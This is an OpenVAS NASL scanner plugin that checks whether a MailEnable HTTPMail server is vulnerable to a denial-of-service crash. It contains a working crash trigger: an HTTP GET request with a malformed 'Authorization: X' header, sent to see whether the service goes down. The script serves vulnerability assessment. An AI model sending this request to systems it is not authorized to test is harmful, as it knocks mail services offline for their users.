# OpenVAS Vulnerability Test
# $Id: mailenable_httpmail_authorization_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: MailEnable HTTPMail Service Authorization Header DoS Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server is affected by a denial of service flaw.

Description :

The remote host is running an instance of MailEnable that has a flaw
in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP
request with a malformed Authorization header, which causes a NULL
pointer dereference error and crashes the HTTPMail service.";

tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.19 or later.";

if (description) {
  script_id(14654);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:R/AC:L/Au:N/C:N/A:P/I:N/B:A");
  script_tag(name:"risk_factor", value:"Medium");

  name = "MailEnable HTTPMail Service Authorization Header DoS Vulnerability";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;
  script_description(desc);
 
  summary = "Checks for authorization header DoS vulnerability in MailEnable HTTPMail service";
  script_summary(summary);
 
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Web application abuses";
  script_family(family);

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Host: ", get_host_name(), ":", port, "\r\n",
    "Authorization: X\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_warning(port);
  }
}
